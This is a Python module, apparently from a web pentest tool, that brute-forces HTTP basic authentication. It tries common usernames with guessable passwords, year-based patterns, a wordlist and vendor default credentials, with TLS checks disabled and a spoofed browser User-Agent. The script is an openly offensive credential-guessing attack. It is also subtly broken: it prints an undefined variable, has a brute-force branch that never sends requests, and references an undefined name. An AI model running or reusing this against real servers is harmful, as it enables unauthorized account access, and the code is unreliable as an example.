#! /usr/bin/env python3
# -*- coding: utf-8 -*-

from color_config import INFO, found, not_found, action_not_found, action_found
from credz.default_password import default_passwords
import requests
import sys

UserAgent = {'User-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko'}

def http_auth(url, user_known, wordlist, bf, other_name=False):
    """
    http_auth: test http authentification
    """
    print(" {} HTTP authentification".format(found))
    if other_name == "n":
        account_found = False

        usernames = ["admin", "administrateur", "test", "root", "guest", "anonymous", "tomcat", "manager"] if not user_known else [user_known]

        if user_known:
            default_passwords_user = ["{}2019","{}2020","{}2021","{}2022","{}2023","{}@123","{}@123!"]
            for dpu in default_passwords_user:
                req = requests.post(url, auth=(user_known, dpu), verify=False, timeout=10, headers=UserAgent)
                if req.status_code not in [401, 403]:
                    account_found = True
                    print(" {} Account found: {}:{}".format(action_found, u, u))
                    sys.exit()
        for u in usernames:
            req = requests.post(url, auth=(u, u), verify=False, timeout=10, headers=UserAgent)
            if req.status_code not in [401, 403]:
                account_found = True
                print(" {} Account found: {}:{}".format(action_found, u, u))
        for user in usernames:
            with open(wordlist, "r+") as top_pass:
                for tp in top_pass.read().splitlines():
                    req = requests.post(url, auth=(user, tp), verify=False, timeout=10, headers=UserAgent)
                    if req.status_code not in [401, 403]:
                        account_found = True
                        print(" {} Account found: {}:{}".format(action_found, user, tp))
                        sys.exit()
                    sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(user, tp))
                    sys.stdout.write("\033[K")
        if not account_found and bf:
            for user in usernames:
                user = user.replace("\n","")
                with open(wordlist, "r+") as top_pass:
                    for tp in top_pass.read().splitlines():
                        if req.status_code not in [401, 403]:
                            print("  {} Account found: {}:{}".format(found, user, tp))
                            if not urls_file:
                                sys.exit()
                            return True
                        sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(user, tp))
                        sys.stdout.write("\033[K")
    else:
        for dp in default_passwords:
            if dp == other_name:
                for d in default_passwords[dp]:
                    user = d.split(":")[0]
                    passwd = d.split(":")[1]
                    try:
                        req = requests.post(url, auth=(user, passwd), verify=False, allow_redirects=False, timeout=10, headers=UserAgent)
                        if req.status_code not in [401, 403]:
                            print("  {}Account found: {}:{}".format(found, user, passwd))
                            sys.exit()
                    except:
                        print(" [!] Error with {}:{}".format(user, passwd))
                        pass
                    sys.stdout.write("\033[34muser: {} | password: {}\033[0m\r".format(user, passwd))
                    sys.stdout.write("\033[K")
    print("-"*30)